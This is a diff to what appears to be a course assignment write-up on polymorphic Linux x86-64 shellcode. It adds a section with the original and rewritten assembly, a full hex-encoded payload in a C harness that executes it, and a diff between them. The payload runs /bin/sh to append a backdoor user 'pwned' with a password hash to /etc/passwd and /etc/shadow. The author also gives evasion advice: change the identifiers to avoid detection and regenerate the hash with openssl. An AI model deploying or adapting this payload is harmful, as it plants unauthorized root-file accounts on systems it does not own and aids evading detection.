@@ -3,16 +3,9 @@ Assignment #6 – Writing polymorphic shellcodes
 
 In this assignment I had to choose three shellcodes from [Shell Storm][shell_storm_shellcode] and write polymorphic versions of them. Bonus points if your version is smaller than the original. I chose the following:
 
-    Linux/x86-64 - Add map in /etc/hosts file - 110 bytes by Osanda Malith Jayathissa
-    Linux/x86-64 - Read /etc/passwd - 82 bytes by Mr.Un1k0d3r
-
-
-    $ curl -s http://shell-storm.org/shellcode/ | grep "Linux/x86-64" | shuf -n3
-    <li><a href="/shellcode/files/shellcode-880.php">Linux/x86-64 - Add user and password with open,write,close - 358 bytes</a> <i>by Christophe G</i></li>
-    <li><a href="/shellcode/files/shellcode-76.php">Linux/x86-64 - execve(/bin/sh, [/bin/sh], NULL) - 33 bytes</a> <i>by hophet</i></li>
-    <li><a href="/shellcode/files/shellcode-879.php">Linux/x86-64 - Add user and password with echo cmd - 273 bytes</a> <i>by Christophe G</i></li>
-
-
+- Linux/x86-64 - Add map in /etc/hosts file - 110 bytes by Osanda Malith Jayathissa
+- Linux/x86-64 - Read /etc/passwd - 82 bytes by Mr.Un1k0d3r
+- Linux/x86-64 - Add user and password with echo cmd - 273 bytes by Christophe G
 
 Add map in `/etc/hosts` file - 110 bytes by [@OsandaMalith][@OsandaMalith]
 --------------------------------------------------------------------------
@@ -361,10 +354,149 @@ Diff:
     > path: db "/etc/passwdZ"
 
 
+Add user and password with echo cmd - 273 bytes by Christophe G
+---------------------------------------------------------------
+
+The original shellcode can be found [here][shell_storm_shellcode_879]. It is reproduced below. It uses `execve` to execute `/bin/sh -c echo ...` to add a new line to both `/etc/passwd` and `/etc/shadow`. The line added to `passwd` just has a reference to a new user, while on `shadow` a hash is added corresponding to the password of the added user. The number of instructions is short, most of the size comes from the string with the commands.
+
+    ; shellcode name add_user_password
+    ; Author    : Christophe G SLAE64-1337
+    ; Len       : 273 bytes
+    ; Language  : Nasm
+    ; "name = pwned ; pass = $pass$"
+    ; add user and password with echo cmd
+    ; tested kali linux , kernel 3.12
+
+    global _start
+    _start:
+            jmp short findaddress
+
+    _realstart:
+            pop rdi
+            xor byte [rdi + 7] , 0x41 ; replace A to null byte "/bin/shA"
+            xor byte [rdi + 10]  ,0x41 ; same "-cA"
+            xor rdx , rdx
+            lea rdi , [rdi]
+            lea r9 , [rdi + 8]
+            lea r10 , [rdi + 11]
+            push rdx
+            push r10
+            push r9
+            push rdi
+            mov rsi , rsp
+            add al , 59
+            syscall
+
+    findaddress:
+            call _realstart
+            string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"
+
+My polymorphic version is below. In the string I substituted A with Z. Then I changed the way in which Z was xored out of the string, including substituting R8 and R10 for ones that result in shorter opcodes. Finally I removed uneeded spaces from the command string, namely around `>>` and `;`. I opted to leave the user, IDs and hash unaltered, but if you actually use this shellcode and want to avoid detection it should be a good idea to change that. I added a comment on how to change the password. The original shellcode was 273 bytes long, while the polymorphic one is 266. Should you need to further reduce size, my bet would be to change the hashing algorithm of the password to MD5 (`-1`) or crypt (`-crypt`), which result in much shorter hashes (with the downside that the hash becomes much easier to crack).
+
+    global _start
+    _start:
+        jmp short findaddress
+
+    _realstart:
+        pop rdi
+        push 0x5a
+        pop rax
+        lea rbx, [rdi + 8]
+        lea rcx, [rdi + 11]
+        xor byte [rbx-1], al     ; replace Z with null byte in "/bin/shZ"
+        xor byte [rcx-1], al     ; same for "-cZ"
+
+        cdq
+        push rdx                 ; NULL
+        push rcx                 ; command
+        push rbx                 ; "-c"
+        push rdi                 ; "/bin/sh"
+        push rsp
+        pop rsi
+        mov al, 59               ; __NR_execve
+        syscall
+
+    findaddress:
+        call _realstart
+        string : db "/bin/shZ-cZecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash>>/etc/passwd;echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::>>/etc/shadow"
+        ; you can generate new hashes with:
+        ; echo '$pass$' | openssl passwd -stdin -6 | sed -e 's/\$/\\$/g'
+
+
+    #include <stdio.h>
+    #include <string.h>
+
+    char code[] =
+    "\xeb\x1d\x5f\x6a\x5a\x58\x48\x8d\x5f\x08\x48\x8d\x4f\x0b\x30\x43\xff\x30"
+    "\x41\xff\x99\x52\x51\x53\x57\x54\x5e\xb0\x3b\x0f\x05\xe8\xde\xff\xff\xff"
+    "\x2f\x62\x69\x6e\x2f\x73\x68\x5a\x2d\x63\x5a\x65\x63\x68\x6f\x20\x70\x77"
+    "\x6e\x65\x64\x3a\x78\x3a\x31\x30\x30\x31\x3a\x31\x30\x30\x32\x3a\x70\x77"
+    "\x6e\x65\x64\x2c\x2c\x2c\x3a\x2f\x68\x6f\x6d\x65\x2f\x70\x77\x6e\x65\x64"
+    "\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x3e\x3e\x2f\x65\x74\x63\x2f\x70"
+    "\x61\x73\x73\x77\x64\x3b\x65\x63\x68\x6f\x20\x70\x77\x6e\x65\x64\x3a\x5c"
+    "\x24\x36\x5c\x24\x75\x69\x48\x37\x78\x2e\x76\x68\x69\x76\x44\x37\x4c\x4c"
+    "\x58\x59\x5c\x24\x37\x73\x4b\x31\x4c\x31\x4b\x57\x2e\x43\x68\x71\x57\x51"
+    "\x5a\x6f\x77\x33\x65\x73\x76\x70\x62\x57\x56\x58\x79\x52\x36\x4c\x41\x34"
+    "\x33\x31\x74\x4f\x4c\x68\x4d\x6f\x52\x4b\x6a\x50\x65\x72\x6b\x47\x62\x78"
+    "\x52\x51\x78\x64\x49\x4a\x4f\x32\x49\x61\x6d\x6f\x79\x6c\x37\x79\x61\x56"
+    "\x4b\x55\x56\x6c\x51\x38\x44\x4d\x6b\x33\x67\x63\x48\x4c\x4f\x4f\x66\x2f"
+    "\x3a\x31\x36\x32\x36\x31\x3a\x30\x3a\x39\x39\x39\x39\x39\x3a\x37\x3a\x3a"
+    "\x3a\x3e\x3e\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77";
+
+    int main() {
+        printf("length: %lu\n", strlen(code));
+        ((int(*)()) code)();
+    }
+
+Diff:
+
+    $ diff <(nasm -E shellcode-879_add-user-and-password-with-echo.nasm) <(nasm -E shellcode-879_add-user-and-password-with-echo_polymorph.nasm) | grep -v "^[<>] $"  | yank
+
+    1,11c1
+    < %line 1+1 shellcode-879_add-user-and-password-with-echo.nasm
+    ---
+    > %line 1+1 shellcode-879_add-user-and-password-with-echo_polymorph.nasm
+    19,24c9,16
+    <  xor byte [rdi + 7] , 0x41
+    <  xor byte [rdi + 10] ,0x41
+    <  xor rdx , rdx
+    <  lea rdi , [rdi]
+    <  lea r9 , [rdi + 8]
+    <  lea r10 , [rdi + 11]
+    ---
+    >  push 0x5a
+    >  pop rax
+    >  lea rbx, [rdi + 8]
+    >  lea rcx, [rdi + 11]
+    >  xor byte [rbx-1], al
+    >  xor byte [rcx-1], al
+    >  cdq
+    26,27c18,19
+    <  push r10
+    <  push r9
+    ---
+    >  push rcx
+    >  push rbx
+    29,30c21,23
+    <  mov rsi , rsp
+    <  add al , 59
+    ---
+    >  push rsp
+    >  pop rsi
+    >  mov al, 59
+    33d25
+    36c28,30
+    <  string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"
+    ---
+    >  string : db "/bin/shZ-cZecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash>>/etc/passwd;echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::>>/etc/shadow"
+
+And that's all for this one.
+
+
 [shell_storm_shellcode]: http://shell-storm.org/shellcode/
 [shell_storm_shellcode_896]: http://shell-storm.org/shellcode/files/shellcode-896.php
 [shell_storm_shellcode_878]: http://shell-storm.org/shellcode/files/shellcode-878.php
-
+[shell_storm_shellcode_879]: http://shell-storm.org/shellcode/files/shellcode-879.php
 [@OsandaMalith]: https://twitter.com/OsandaMalith
 
 ----
